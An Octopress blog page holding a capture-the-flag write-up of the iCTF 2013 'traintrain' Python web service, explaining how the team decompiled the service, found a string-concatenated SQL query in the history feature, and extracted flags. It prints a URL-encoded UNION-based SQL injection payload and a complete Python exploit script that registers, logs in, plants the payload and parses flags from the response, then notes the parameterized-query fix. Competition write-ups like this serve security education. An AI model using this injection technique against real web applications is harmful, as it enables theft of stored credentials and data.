
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>iCTF 2013 traintrain writeup - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="Traintrain is a web system written in python. There is a register/login page, where we can login using username/password from traintrain.ini. Then a &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net//ictf-2013-traintrain-writeup">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="header-inner">
    <span class="first"><a href="/">blue-lotus</a></span>
    <span><a href="/about">about</a></span>
    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
  </div>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">iCTF 2013 Traintrain Writeup</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-03-24T00:00:00+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2013</time>
        
         | <a href="#disqus_thread">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Traintrain is a web system written in python.</p>

<p>There is a register/login page, where we can login using username/password from traintrain.ini. Then a solution page showed up, asks for a solution. Nothing special so far.</p>

<p>Under the service dir, there is a sqlite3 db file detected using file commmand. Open it and execute .dump, we can get the table and data, here is a snippet:</p>

<pre><code>CREATE TABLE users (username text, password text, authorization text, session text, history text, score int, assignment text, solution text);
INSERT INTO users VALUES('johndoe','3858f62230ac3c915f300c664312c63f','ab6eff381fffea763a81b73',NULL,NULL,NULL,NULL,NULL);
INSERT INTO users VALUES('janedoe','96948aad3fcae80c08a35c9b5958cd89','ab56a388299ef6deab12552ccc1',NULL,NULL,NULL,NULL,NULL);
INSERT INTO users VALUES('aledivlew','fcccdf1344ad3078c2fbec2194996a08','FLGeFrCu4pF4ipCF','0d1444c3861cf373e36b24e6b5a5f785','/',NULL,NULL,NULL);
</code></pre>

<p>So the flag should be the authorization text of some users.</p>

<p>The source codes are not presented in the service dir. So we decompiled the python bytecode using <a href="https://github.com/wibiti/uncompyle2">uncompyle2</a>. You can find the source code <a href="https://gist.github.com/zTrix/5230705">here</a>.</p>

<p>The code is a bit complex. We read through the code thoroughly, even the generate and calculate logic. The basic idea is injection, but We come up with several ideas turned out to be useless, because the code is well protected. After some more review, we noticed that there is a function called history, and the history sql is the only one built by string concatenation rather than sqlite library protected construction. So we decided to do sql injection here.</p>

<pre><code>query = "select username, score from users where history LIKE '%%%s%%' and not session='%s'" % (history, session)
</code></pre>

<p>The session variable is well checked and hard to inject, but we can control history variable, since the url path will be joined using &#8216;:&#8217; as separator to form the history string, e.g. &#8220;/:/solution&#8221;.</p>

<p>Then we carefully construct a path:</p>

<p>%&amp;#8217; or 1=1 union select username, authorization from users where 1=1 or &amp;#8217;:/solution%&amp;#8217;=&amp;#8217;</p>

<p>which will be urlencoded to</p>

<p>%25&amp;#8217;%20or%201%3D1%20union%20select%20username%2C%20authorization%20from%20users%20where%201%3D1%20or%20&amp;#8217;%3A%2Fsolution%25&amp;#8217;%3D&amp;#8217;</p>

<p>Register a user and login to get a session, hit this urlpath, then it will be stored as the history string. After that, we hit &#8220;/solution&#8221; again to trigger the injected sql, and the flag string will be returned in html. So just parse out the flag and return!</p>

<p>Here is the exploit code:</p>

<pre><code>class Exploit():

  def tt(self, ip, port, flag_id):
    import httplib, time, urllib, random

    conn = httplib.HTTPConnection(ip, port)
    uu = random.choice('asfaasdf') + random.choice('asfaasdf') + random.choice('asfaasdf') + random.choice('asfaasdf')
    params = urllib.urlencode({'username': uu, 'password': uu, 'authorization': uu})
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    conn.request("POST", "/register", params, headers)
    response = conn.getresponse()
    header = response.getheaders()
    data = response.read()
    conn.close()

    conn = httplib.HTTPConnection(ip, port)
    conn.request('POST', "/login", urllib.urlencode({'username': uu, 'password': uu}), headers)
    response = conn.getresponse()
    header = response.getheaders()
    data = response.read()
    for k, v in header:
        if k.lower() == 'set-cookie':
            cookie = v
    #print cookie
    conn.close()
    #print '--python cookie', cookie

    sql = "%25\'%20or%201%3D1%20union%20select%20username%2C%20authorization%20from%20users%20where%201%3D1%20or%20\'%3A%2Fsolution%25\'%3D\'"
    headers['cookie'] = cookie
    conn = httplib.HTTPConnection(ip, port)
    conn.request('POST', "/" + sql, urllib.urlencode({'username': uu, 'password': uu}), headers)
    response = conn.getresponse()
    header = response.getheaders()
    data = response.read()
    conn.close()
    #print '--insert', len(data), data

    conn = httplib.HTTPConnection(ip, port)
    conn.request('POST', "/solution", urllib.urlencode({'solution': '1', 'assignment': '2'}), headers)
    response = conn.getresponse()
    header = response.getheaders()
    data = response.read()
    #print '--result', len(data), data
    conn.close()

    import re
    mat = re.findall('&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;.*?&lt;td&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;', data)

    flag = ''
    #print mat
    for item in mat:
        if item[1].startswith('FLG'):
            flag = item[1]
        if item[0] == flag_id and item[1] != 'None':
            return item[1]
    return flag

  def execute(self, ip, port, flag_id):

    # Put your awesomeness here. You are free to import/use whatever
    # standard Python library you want.

    # Your exploit gets as parameters the IP/PORT of the service to
    # attack. The IP is a string, the PORT is an integer.

    # For some services, the "flag_id" parameter will be provided:
    # sometimes, this is needed to specify which flag you need to
    # steal (in case there are many on the server). If you feel you
    # don't need to use the "flag_id" parameter, just ignore it.
    # Still, your execute() method will always receive the "flag_id"
    # parameter.

    self.flag = self.tt(ip, port, flag_id);

  def result(self):
    return {'FLAG' : self.flag }
</code></pre>

<p>Have known above, we can easily fix the exploit by replace the string concatenation of the sql by sqlite library construction.</p>

<p>Many thanks to Chao Liu who showed expert level hacking skills working with me on this problem.</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">zTrix</span></span>

      








  


<time datetime="2013-03-24T00:00:00+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net//ictf-2013-traintrain-writeup/" data-via="" data-counturl="http://www.blue-lotus.net//ictf-2013-traintrain-writeup/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/ictf-2013-curiosity-writeup/" title="Previous Post: iCTF 2013 curiosityblogging writeup">&laquo; iCTF 2013 curiosityblogging writeup</a>
      
      
        <a class="basic-alignment right" href="/plaidctf-2013-crypto100-crypto-writeup/" title="Next Post: PlaidCTF 2013 Crypto100 crypto writeup">PlaidCTF 2013 Crypto100 crypto writeup &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'bluelotus';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
